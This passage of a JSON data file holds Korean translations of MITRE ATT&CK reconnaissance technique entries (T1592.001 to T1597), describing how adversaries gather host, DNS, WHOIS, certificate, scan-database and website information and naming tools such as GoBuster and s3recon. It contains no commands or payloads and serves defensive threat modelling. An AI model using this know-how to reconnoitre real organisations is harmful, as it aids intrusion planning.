      "description": "공격자는 목표의 호스트 하드웨어에 대한 정보를 수집하여 타겟팅에 활용할 수 있습니다. 하드웨어 인프라에 대한 정보는 특정 호스트의 종류 및 버전, 추가 방어 보호 장치(예: 카드/생체 인식 리더기, 전용 암호화 하드웨어 등)의 존재 등 다양한 세부 정보를 포함할 수 있습니다.\n\n공격자는 [능동 스캐닝](https://attack.mitre.org/techniques/T1595) (예: 호스트 이름, 서버 배너, 사용자 에이전트 문자열)을 통한 직접 수집 행동 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 여러 방법으로 이러한 정보를 수집할 수 있습니다. 또한 공격자는 사이트를 침해한 후 방문자로부터 호스트 정보를 수집하기 위해 설계된 악성 콘텐츠를 포함할 수 있습니다. (출처: ATT ScanBox) 하드웨어 인프라에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 공격자에게 노출될 수도 있습니다 (예: 구인 게시물, 네트워크 맵, 평가 보고서, 이력서 또는 구매 송장). 이러한 정보를 수집하는 것은 여러 형태의 정찰 기회를 제공합니다 (예: [열린 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [열린 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원을 구축하는 데 도움이 됩니다 (예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 또는 초기 접근을 위한 기회를 제공할 수 있습니다 (예: [하드웨어 공급망 침해](https://attack.mitre.org/techniques/T1195/003) 또는 [하드웨어 추가](https://attack.mitre.org/techniques/T1200)).",
      "external_id": "T1592.001",
      "modified": "2021-10-17T16:32:10.810Z",
      "title": "Hardware",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅에 사용할 수 있는 피해자의 호스트 소프트웨어에 대한 정보를 수집할 수 있습니다. 설치된 소프트웨어에 대한 정보는 특정 호스트의 유형 및 버전과 같은 다양한 세부정보 및 추가 방어 보호 조치를 나타낼 수 있는 추가 구성 요소의 존재를 포함할 수 있습니다(예: 안티바이러스, SIEM 등).\n\n적대자는 [능동 스캔](https://attack.mitre.org/techniques/T1595) (예: 리스닝 포트, 서버 배너, 사용자 에이전트 문자열) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 다양한 방법으로 이 정보를 수집할 수 있습니다. 또한 적대자는 사이트를 침해하여 방문자로부터 호스트 정보를 수집하도록 설계된 악성 콘텐츠를 포함할 수 있습니다. (출처: ATT ScanBox) 설치된 소프트웨어에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트(예: 구인 게시물, 네트워크 맵, 평가 보고서, 이력서 또는 구매 송장)를 통해 적대자에게 노출될 수도 있습니다. 이 정보를 수집하면 다른 형태의 정찰 기회(예: [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원 설정(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 그리고 초기 접근을 위한 기회(예: [공급망 손상](https://attack.mitre.org/techniques/T1195) 또는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133))를 드러낼 수 있습니다.",
      "external_id": "T1592.002",
      "modified": "2021-10-17T16:33:19.596Z",
      "title": "Software",
      "translated": true
    },
    {
      "description": "적대자는 목표 시스템의 호스트 펌웨어에 대한 정보를 수집할 수 있으며, 이 정보는 타겟팅 과정에서 사용될 수 있습니다. 호스트 펌웨어에 대한 정보는 특정 호스트의 유형과 버전과 같은 다양한 세부 정보를 포함할 수 있으며, 이를 통해 환경 내의 호스트에 대한 추가 정보를 유추할 수 있습니다(예: 구성, 목적, 연령/패치 수준 등).\n\n적대자는 정보를 직접적으로 유도하는 방법(예: [정보를 위한 피싱](https://attack.mitre.org/techniques/T1598))을 통해 이 정보를 수집할 수 있습니다. 호스트 펌웨어에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트(예: 구인 공고, 네트워크 맵, 평가 보고서, 이력서 또는 구매 송장)를 통해서만 적대자에게 노출될 수 있습니다. (출처: ArsTechnica Intel) 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며(예: [개방된 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [개방된 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원을 구축하거나(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 초기 접근을 위한 기회를 마련할 수 있습니다(예: [공급망 침해](https://attack.mitre.org/techniques/T1195) 또는 [공공 노출 애플리케이션 공격](https://attack.mitre.org/techniques/T1190)).",
      "external_id": "T1592.003",
      "modified": "2021-04-15T03:22:46.759Z",
      "title": "Firmware",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 중 사용할 수 있는 피해자의 클라이언트 구성에 대한 정보를 수집할 수 있습니다. 클라이언트 구성에 대한 정보는 운영체제/버전, 가상화, 아키텍처(예: 32비트 또는 64비트), 언어 및/또는 시간대 등 다양한 세부사항과 설정을 포함할 수 있습니다.\n\n공격자는 [능동 스캐닝](https://attack.mitre.org/techniques/T1595)(예: 리스닝 포트, 서버 배너, 사용자 에이전트 문자열) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 다양한 방법을 통해 이 정보를 수집할 수 있습니다. 또한 공격자는 사이트를 손상시킨 후 방문자로부터 호스트 정보를 수집하기 위해 설계된 악성 콘텐츠를 포함할 수 있습니다. (출처: ATT ScanBox) 클라이언트 구성에 대한 정보는 온라인이나 기타 접근 가능한 데이터 세트를 통해 공격자에게 노출될 수도 있습니다(예: 구인 게시물, 네트워크 맵, 평가 보고서, 이력서 또는 구매 송장). 이 정보를 수집하는 것은 다른 형태의 정찰 기회(예: [공식 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [공식 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 리소스 구축(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 및/또는 초기 접근(예: [공급망 침해](https://attack.mitre.org/techniques/T1195) 또는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133))을 위한 기회를 드러낼 수 있습니다.",
      "external_id": "T1592.004",
      "modified": "2021-10-17T16:35:09.668Z",
      "title": "Client Configurations",
      "translated": true
    },
    {
      "description": "적대자는 목표를 설정하는 데 사용할 수 있는 피해자에 대한 정보를 찾기 위해 자유롭게 사용 가능한 웹사이트 및/또는 도메인을 검색할 수 있습니다. 피해자에 대한 정보는 소셜 미디어, 뉴스 사이트 또는 채용이나 요청된/보상된 계약과 같은 비즈니스 운영에 대한 정보를 호스팅하는 사이트와 같은 다양한 온라인 사이트에서 제공될 수 있습니다. (인용: Cyware 소셜 미디어) (인용: SecurityTrails 구글 해킹) (인용: ExploitDB 구글 해킹)\n\n적대자는 수집하고자 하는 정보에 따라 다양한 온라인 사이트를 검색할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며(ex: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원을 설정하는 데 도움이 될 수 있습니다(ex: [계정 설정](https://attack.mitre.org/techniques/T1585) 또는 [계정 공격](https://attack.mitre.org/techniques/T1586)), 및/또는 초기 접근에 기여할 수 있습니다(ex: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [피싱](https://attack.mitre.org/techniques/T1566)).",
      "external_id": "T1593",
      "modified": "2024-09-12T19:19:47.759Z",
      "title": "Search Open Websites/Domains",
      "translated": true
    },
    {
      "description": "침입자는 목표 설정 과정에서 활용할 수 있는 희생자에 대한 정보를 얻기 위해 소셜 미디어를 검색할 수 있습니다. 소셜 미디어 사이트에는 조직에 대한 비즈니스 공지사항, 직원의 역할, 위치 및 관심사와 같은 다양한 정보가 포함될 수 있습니다.\n\n침입자는 수집하려는 정보에 따라 다양한 소셜 미디어 사이트를 검색할 수 있습니다. 위협 행위자는 이러한 사이트에서 수동적으로 데이터를 수집할 수 있으며, 수집한 정보를 사용하여 희생자가 특정 정보를 드러내도록 유도하는 가짜 프로필/그룹을 생성할 수도 있습니다 (예: [스피어 피싱 서비스](https://attack.mitre.org/techniques/T1598/001)). (출처: Cyware 소셜 미디어) 이러한 출처의 정보는 다른 형태의 정찰 작업 기회를 드러낼 수 있으며 (예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원을 설정하는 데 도움을 줄 수 있습니다 (예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 손상](https://attack.mitre.org/techniques/T1586)), 그리고/또는 초기 접근을 획득하는 데 기여할 수 있습니다 (예: [서비스를 통한 스피어 피싱](https://attack.mitre.org/techniques/T1566/003)).",
      "external_id": "T1593.001",
      "modified": "2021-04-15T03:52:40.958Z",
      "title": "Social Media",
      "translated": true
    },
    {
      "description": "적대자들은 피해자에 대한 정보를 수집하기 위해 검색 엔진을 사용할 수 있으며, 이 정보는 타겟팅 과정에서 사용될 수 있습니다. 검색 엔진 서비스는 일반적으로 온라인 사이트를 탐색하여 컨텍스트를 색인화하며, 사용자는 특정 키워드나 특정 유형의 콘텐츠(예: 파일 형식)를 검색하기 위한 특수 구문을 제공받을 수 있습니다.(인용: SecurityTrails Google Hacking)(인용: ExploitDB Google Hacking)\n\n적대자들은 수집하려는 정보에 따라 다양한 검색 엔진 쿼리를 작성할 수 있습니다. 위협 행위자는 검색 엔진을 사용하여 피해자에 대한 일반 정보를 수집할 뿐만 아니라, 특수 쿼리를 사용하여 네트워크 세부 정보나 자격 증명과 같은 민감한 정보의 유출을 찾아낼 수도 있습니다. 이러한 출처로부터 얻은 정보는 다른 탐색 기회를 드러낼 수 있으며(예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원 구성(예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 손상](https://attack.mitre.org/techniques/T1586)), 및/또는 초기 접근(예: [유효한 계정](https://attack.mitre.org/techniques/T1078) 또는 [피싱](https://attack.mitre.org/techniques/T1566))을 수립하는 데 도움을 줄 수 있습니다.",
      "external_id": "T1593.002",
      "modified": "2024-09-12T19:19:47.758Z",
      "title": "Search Engines",
      "translated": true
    },
    {
      "description": "공격자는 타깃 선정에 사용할 수 있는 피해자에 대한 정보를 찾기 위해 공개 코드 저장소를 검색할 수 있습니다. 피해자는 GitHub, GitLab, SourceForge 및 BitBucket과 같은 다양한 서드파티 웹사이트에 코드를 저장할 수 있습니다. 사용자는 일반적으로 웹 애플리케이션이나 git과 같은 명령줄 유틸리티를 통해 코드 저장소와 상호작용합니다.\n\n공격자는 피해자에 대한 다양한 정보를 찾기 위해 여러 공개 코드 저장소를 검색할 수 있습니다. 공개 코드 저장소는 종종 피해자에 대한 일반적인 정보, 예를 들어 자주 사용되는 프로그래밍 언어와 라이브러리, 직원 이름 등을 제공할 수 있습니다. 공격자는 우발적으로 유출된 자격 증명이나 API 키와 같은 민감한 데이터도 식별할 수 있습니다. (인용: GitHub 클라우드 서비스 자격 증명) 이러한 출처의 정보는 다른 종류의 정찰 기회를 드러낼 수 있습니다(예: [정보를 위한 피싱](https://attack.mitre.org/techniques/T1598)), 운영 자원 구축(예: [계정 손상](https://attack.mitre.org/techniques/T1586) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)), 및/또는 초기 액세스(예: [유효한 계정](https://attack.mitre.org/techniques/T1078) 또는 [피싱](https://attack.mitre.org/techniques/T1566)).\n\n**참고:** 이는 [코드 저장소](https://attack.mitre.org/techniques/T1213/003)와 구별되며, 이는 비공식 및 내부 호스팅 코드 저장소에 대한 [수집](https://attack.mitre.org/tactics/TA0009)을 중점적으로 다룹니다.",
      "external_id": "T1593.003",
      "modified": "2022-10-26T18:01:20.520Z",
      "title": "Code Repositories",
      "translated": true
    },
    {
      "description": "공격자는 타깃 설정에 사용할 수 있는 정보를 찾기 위해 피해자가 소유한 웹사이트를 검색할 수 있습니다. 피해자가 소유한 웹사이트에는 부서/부문의 이름, 물리적 위치, 주요 직원에 대한 데이터(예: 이름, 역할 및 연락처 정보(예: [이메일 주소](https://attack.mitre.org/techniques/T1589/002))와 같은 다양한 세부사항이 포함될 수 있습니다. 이러한 사이트에는 비즈니스 운영 및 관계를 강조하는 세부정보도 포함될 수 있습니다. (출처: Comparitech Leak)\n\n공격자는 피해자가 소유한 웹사이트를 검색하여 실행 가능한 정보를 수집할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며(예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공식 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원 구축(예: [계정 설정](https://attack.mitre.org/techniques/T1585) 또는 [계정 손상](https://attack.mitre.org/techniques/T1586)) 및/또는 초기 접근(예: [신뢰 관계](https://attack.mitre.org/techniques/T1199) 또는 [피싱](https://attack.mitre.org/techniques/T1566))을 설정할 수 있습니다.\n\n웹사이트를 수동으로 탐색하는 것 외에도, 공격자는 추가적인 민감한 정보나 취약한 기능이 포함된 숨겨진 디렉토리나 파일을 식별하려고 시도할 수 있습니다. 이들은 [단어 목록 스캐닝](https://attack.mitre.org/techniques/T1595/003)과 같은 자동화된 활동을 통해, 또는 sitemap.xml 및 robots.txt와 같은 파일을 활용하여 이를 수행할 수 있습니다. (출처: Perez Sitemap XML 2023)(출처: Register Robots TXT 2015)",
      "external_id": "T1594",
      "modified": "2024-10-02T18:52:21.278Z",
      "title": "Search Victim-Owned Websites",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 과정에서 사용할 수 있는 정보를 수집하기 위해 능동적 정찰 스캔을 수행할 수 있습니다. 능동적 스캔은 공격자가 네트워크 트래픽을 통해 피해자의 인프라를 탐색하는 방식으로, 직접적인 상호작용이 없는 다른 정찰 방법과는 다릅니다.\n\n공격자는 수집하고자 하는 정보에 따라 다양한 형태의 능동적 스캔을 수행할 수 있습니다. 이러한 스캔은 ICMP와 같은 네트워크 프로토콜의 기본 기능을 활용하는 것과 같은 여러 방법으로 수행될 수 있습니다. 이러한 스캔에서 얻은 정보는 다른 형태의 정찰 기회를 제공할 수 있습니다(예: [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원 수립(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 그리고/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [공개 애플리케이션 악용](https://attack.mitre.org/techniques/T1190))에 활용될 수 있습니다.",
      "external_id": "T1595",
      "modified": "2022-03-08T20:58:13.661Z",
      "title": "Active Scanning",
      "translated": true
    },
    {
      "description": "공격자는 피해자의 IP 블록을 스캔하여 표적 설정에 사용할 수 있는 정보를 수집할 수 있습니다. 공인 IP 주소는 조직에 블록 단위로 또는 순차적인 주소 범위로 할당될 수 있습니다.\n\n공격자는 IP 블록을 스캔하여 [피해자 네트워크 정보 수집](https://attack.mitre.org/techniques/T1590)을 수행할 수 있습니다. 이를 통해 어떤 IP 주소가 활성화되어 있는지와 해당 주소에 할당된 호스트에 대한 보다 구체적인 정보 등을 파악할 수 있습니다. 스캔은 간단한 핑( ICMP 요청 및 응답)에서부터 서버 배너나 기타 네트워크 아티팩트를 통해 호스트 소프트웨어/버전을 식별할 수 있는 보다 복잡한 스캔까지 다양하게 이루어질 수 있습니다. 이러한 스캔에서 얻은 정보는 다른 형태의 정보 수집 기회를 드러낼 수 있으며(예: [사용 가능한 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [사용 가능한 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영적 자원 설정(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 획득](https://attack.mitre.org/techniques/T1588)) 및/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133))을 위한 기회를 제공할 수 있습니다.",
      "external_id": "T1595.001",
      "modified": "2024-10-15T13:46:55.039Z",
      "title": "Scanning IP Blocks",
      "translated": true
    },
    {
      "description": "공격자는 목표를 정하기 위해 피해자의 취약점을 스캔할 수 있습니다. 취약점 스캔은 일반적으로 특정 공격자가 사용하고자 하는 취약점의 대상이 될 수 있는 목표 호스트/응용 프로그램(예: 소프트웨어 및 버전)의 구성이 일치하는지를 확인합니다.\n\n이러한 스캔은 또한 보다 일반적인 방법으로 피해자 호스트 정보를 수집하여 더 많이 알려진, 악용 가능한 취약점을 식별하는 데 사용될 수 있습니다. 취약점 스캔은 일반적으로 서버 배너, 리스닝 포트 또는 기타 네트워크 아티팩트를 통해 실행 중인 소프트웨어 및 버전 번호를 수집합니다. (출처: OWASP 취약점 스캐닝) 이러한 스캔에서 얻은 정보는 다른 형태의 정찰 활동(예: 공개 웹사이트/도메인 검색이나 공개 기술 데이터베이스 검색), 운영 자원 수립(예: 능력 개발 또는 능력 획득), 그리고 초기 접근(예: 공개 애플리케이션 악용) 기회를 제공할 수 있습니다.",
      "external_id": "T1595.002",
      "modified": "2024-10-15T13:37:31.317Z",
      "title": "Vulnerability Scanning",
      "translated": true
    },
    {
      "description": "적대 세력은 무차별 대입 및 크롤링 기법을 사용하여 인프라를 반복적으로 탐색할 수 있습니다. 이 기술은 [무차별 대입](https://attack.mitre.org/techniques/T1110)과 유사한 방법을 사용하지만, 의도는 유효한 자격 증명의 발견이 아닌 콘텐츠 및 인프라의 식별입니다. 이러한 스캔에서 사용되는 단어 목록은 일반적이고 흔히 사용되는 이름, 파일 확장자 또는 특정 소프트웨어와 관련된 용어를 포함할 수 있습니다. 적대 세력은 또한 다른 정찰 기술(예: [피해자 조직 정보 수집](https://attack.mitre.org/techniques/T1591) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))에서 수집한 데이터를 사용하여 맞춤형 대상 특정 단어 목록을 만들 수 있습니다.\n\n예를 들어, 적대 세력은 Dirb, DirBuster, GoBuster와 같은 웹 콘텐츠 발견 도구를 사용하고 일반 또는 맞춤형 단어 목록을 활용하여 웹사이트의 페이지 및 디렉터리를 나열할 수 있습니다.(출처: ClearSky Lebanese Cedar 2021년 1월) 이는 그들이 오래된 취약한 페이지나 숨겨진 관리 포털을 발견하는 데 도움이 될 수 있으며, 이러한 포털은 이후 공격의 목표가 될 수 있습니다(예: [공공-facing 어플리케이션 악용](https://attack.mitre.org/techniques/T1190) 또는 [무차별 대입](https://attack.mitre.org/techniques/T1110)).\n\n클라우드 저장 솔루션은 일반적으로 전 세계적으로 고유한 이름을 사용하므로, 적대 세력은 대상 특정 단어 목록과 s3recon, GCPBucketBrute와 같은 도구를 사용하여 클라우드 인프라의 공개 및 비공개 버킷을 나열할 수도 있습니다.(출처: S3Recon GitHub)(출처: GCPBucketBrute) 저장 객체가 발견된 후, 적대 세력은 [클라우드 저장소의 데이터](https://attack.mitre.org/techniques/T1530)를 활용하여 추출하거나 권한 상승 및 측면 이동에 사용될 수 있는 유용한 정보에 접근할 수 있습니다.",
      "external_id": "T1595.003",
      "modified": "2022-04-15T19:10:23.838Z",
      "title": "Wordlist Scanning",
      "translated": true
    },
    {
      "description": "적대자는 표적을 설정하는 데 사용할 수 있는 희생자에 대한 정보를 얻기 위해 자유롭게 이용 가능한 기술 데이터베이스를 검색할 수 있습니다. 희생자에 대한 정보는 도메인/인증서 등록 및 트래픽 또는 스캔에서 수집된 네트워크 데이터/유물의 공개 컬렉션과 같은 온라인 데이터베이스 및 리포지토리에서 확인할 수 있습니다. (출처: WHOIS)(출처: DNS Dumpster)(출처: Circl Passive DNS)(출처: Medium SSL Cert)(출처: SSLShopper Lookup)(출처: DigitalShadows CDN)(출처: Shodan)\n\n적대자는 수집하고자 하는 정보에 따라 다양한 공개 데이터베이스에서 검색할 수 있습니다. 이러한 출처에서의 정보는 다른 형태의 정찰 기회를 드러낼 수 있습니다(예: [정보를 위한 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원의 확보(예: [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)), 및/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [신뢰할 수 있는 관계](https://attack.mitre.org/techniques/T1199)).",
      "external_id": "T1596",
      "modified": "2022-10-18T22:45:19.607Z",
      "title": "Search Open Technical Databases",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅에 사용할 수 있는 피해자에 대한 정보를 얻기 위해 DNS 데이터를 검색할 수 있습니다. DNS 정보에는 등록된 네임서버 및 타겟의 서브도메인, 메일 서버 및 기타 호스트에 대한 주소를 설명하는 레코드를 포함한 다양한 세부정보가 포함될 수 있습니다.\n\n적대자는 실행 가능한 정보를 수집하기 위해 DNS 데이터를 검색할 수 있습니다. 위협 행위자는 타겟 조직의 네임서버에 직접 쿼리를 하거나, 로그된 DNS 쿼리 응답의 중앙 저장소(수동 DNS로 알려짐)를 검색할 수 있습니다(참조: DNS Dumpster)(참조: Circl Passive DNS). 또한 적대자는 내부 네트워크에 대한 정보를 드러내는 DNS 잘못 구성/유출을 찾고 이를 타겟으로 삼을 수 있습니다. 이러한 출처에서 얻은 정보는 다른 형태의 정찰(예: [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)) 기회를 드러내고, 운영 자원 설정(예: [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 침해](https://attack.mitre.org/techniques/T1584)), 및/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [신뢰 관계](https://attack.mitre.org/techniques/T1199))을 설정하는 데 기여할 수 있습니다.",
      "external_id": "T1596.001",
      "modified": "2021-04-15T03:49:13.409Z",
      "title": "DNS/Passive DNS",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 과정에서 사용할 수 있는 피해자에 대한 정보를 찾기 위해 공개 WHOIS 데이터를 검색할 수 있습니다. WHOIS 데이터는 도메인 이름과 같은 인터넷 자원을 할당하고 배정하는 책임이 있는 지역 인터넷 등록 기관(RIR)에 의해 저장됩니다. 누구나 등록된 도메인에 대한 정보, 예를 들어 할당된 IP 블록, 연락처 정보 및 DNS 네임서버에 대한 정보를 알아내기 위해 WHOIS 서버에 쿼리를 할 수 있습니다.(출처: WHOIS)\n\n공격자는 WHOIS 데이터를 검색하여 실용적인 정보를 수집할 수 있습니다. 위협 행위자는 온라인 리소스나 명령줄 유틸리티를 사용하여 WHOIS 데이터를 샅샅이 뒤져 잠재적인 피해자에 대한 정보를 찾을 수 있습니다. 이러한 출처에서 얻은 정보는 다른 형태의 정찰 활동(예: [능동 스캔](https://attack.mitre.org/techniques/T1595) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598))의 기회를 드러내거나, 운영 자원을 설계(예: [인프라 인수](https://attack.mitre.org/techniques/T1583) 또는 [인프라 침해](https://attack.mitre.org/techniques/T1584)), 그리고/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [신뢰 관계](https://attack.mitre.org/techniques/T1199))을 확보하는 데 도움을 줄 수 있습니다.",
      "external_id": "T1596.002",
      "modified": "2021-04-15T03:50:44.113Z",
      "title": "WHOIS",
      "translated": true
    },
    {
      "description": "위협 행위자는 목표를 선정하는 데 사용할 수 있는 피해자에 대한 정보를 얻기 위해 공개 디지털 인증서 데이터를 검색할 수 있습니다. 디지털 인증서는 인증 기관(CA)에 의해 발급되며, 서명된 콘텐츠의 출처를 암호적으로 검증하기 위해 사용됩니다. 이러한 인증서는 암호화된 웹 트래픽(HTTPS SSL/TLS 통신)에 사용되는 것과 같이, 등록된 조직의 이름 및 위치와 같은 정보를 포함하고 있습니다.\n\n위협 행위자는 디지털 인증서 데이터를 검색하여 실질적인 정보를 수집할 수 있습니다. 위협 배우들은 온라인 리소스와 조회 도구를 사용하여 인증서에 대한 정보를 수집할 수 있습니다.(참고: SSLShopper 조회) 디지털 인증서 데이터는 또한 조직이 서명한 아티팩트에서 얻을 수 있습니다(예: 암호화된 웹 트래픽에 사용되는 인증서는 콘텐츠와 함께 제공됨).(참고: Medium SSL Cert) 이러한 소스에서 얻은 정보는 다른 형태의 정찰 기회를 밝혀낼 수 있습니다(예: [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)), 운영 자원을 설정하는 데 도움이 될 수 있습니다(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 그리고/또는 초기 접근을 시도할 수 있는 기회를 제공할 수 있습니다(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [신뢰 관계](https://attack.mitre.org/techniques/T1199)).",
      "external_id": "T1596.003",
      "modified": "2021-04-15T03:48:37.628Z",
      "title": "Digital Certificates",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅에 사용할 수 있는 피해자의 콘텐츠 전송 네트워크(CDN) 데이터 검색을 수행할 수 있습니다. CDN은 조직이 분산되고 로드 밸런싱된 서버 배열에서 콘텐츠를 호스팅할 수 있도록 합니다. CDN은 또한 요청자의 지리적 지역에 따라 콘텐츠 전달을 맞춤화할 수 있는 기능을 제공합니다.\n\n공격자는 실행 가능한 정보를 수집하기 위해 CDN 데이터를 검색할 수 있습니다. 위협 행위자는 온라인 리소스와 조회 도구를 사용하여 CDN 내의 콘텐츠 서버에 대한 정보를 수집할 수 있습니다. 공격자는 또한 민감한 정보가 의도되지 않게 호스팅되는 경우나 조직의 웹사이트에서 호스팅되는 콘텐츠와 동일한 보호 메커니즘(예: 로그인 포털)이 없는 CDN의 잘못된 구성(misconfiguration)을 찾아 목표로 삼을 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 제공할 수 있습니다(예: [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [열린 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 리소스 수립(예: [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 타협](https://attack.mitre.org/techniques/T1584)), 및/또는 초기 접근(예: [드라이브-바이 컴프라미즈](https://attack.mitre.org/techniques/T1189))을 위한 기회를 제공할 수 있습니다.",
      "external_id": "T1596.004",
      "modified": "2021-04-15T03:47:55.905Z",
      "title": "CDNs",
      "translated": true
    },
    {
      "description": "위협 행위자들은 타겟팅에 사용할 수 있는 피해자에 대한 정보를 얻기 위해 공개 스캔 데이터베이스를 검색할 수 있습니다. 다양한 온라인 서비스들은 인터넷 스캔/조사의 결과를 지속적으로 게시하며, 종종 활성 IP 주소, 호스트 이름, 열린 포트, 인증서, 심지어 서버 배너와 같은 정보를 수집합니다. (출처: Shodan)\n\n위협 행위자들은 실행 가능한 정보를 수집하기 위해 스캔 데이터베이스를 검색할 수 있습니다. 위협 행위자들은 이러한 서비스에서 정보를 수집하기 위해 온라인 리소스와 조회 도구를 사용할 수 있습니다. 이들은 이미 식별된 타겟에 대한 정보를 찾거나 이러한 데이터세트를 사용하여 성공적인 침투의 기회를 발견하려고 할 수 있습니다. 이러한 출처의 정보는 다른 형태의 정찰 기회를 드러낼 수 있습니다 (예: [활성 스캔](https://attack.mitre.org/techniques/T1595) 또는 [열린 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 리소스를 구축하는 것 (예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 및/또는 초기 접근 (예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [공개 애플리케이션 악용](https://attack.mitre.org/techniques/T1190)).",
      "external_id": "T1596.005",
      "modified": "2021-04-15T03:49:49.260Z",
      "title": "Scan Databases",
      "translated": true
    },
    {
      "description": "위협 행위자들은 목표를 설정하는 데 사용할 수 있는 피해자에 대한 정보를 닫힌 소스(예: 유료, 비공식적으로 폐쇄된 소스 등)에서 검색하고 수집할 수 있습니다. 피해자에 대한 정보는 신뢰할 수 있는 민간 소스 및 데이터베이스에서 구매할 수 있으며, 예를 들어 기술/위협 정보 데이터 피드에 대한 유료 구독이 해당됩니다. 위협 행위자들은 또한 다크 웹이나 사이버 범죄 블랙 마켓과 같은 신뢰도가 낮은 소스에서 정보를 구매할 수 있습니다.(출처: ZDNET 데이터 판매)\n\n위협 행위자들은 수집하고자 하는 정보에 따라 다양한 닫힌 데이터베이스에서 검색할 수 있습니다. 이러한 소스의 정보는 다른 형태의 정찰 활동에 대한 기회를 드러낼 수 있으며(예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원의 설정(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 획득](https://attack.mitre.org/techniques/T1588)), 그리고/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [유효한 계정](https://attack.mitre.org/techniques/T1078))을 위한 기회를 제공할 수 있습니다.",
      "external_id": "T1597",
      "modified": "2024-10-04T13:12:14.469Z",
      "title": "Search Closed Sources",
      "translated": true
    },
    {
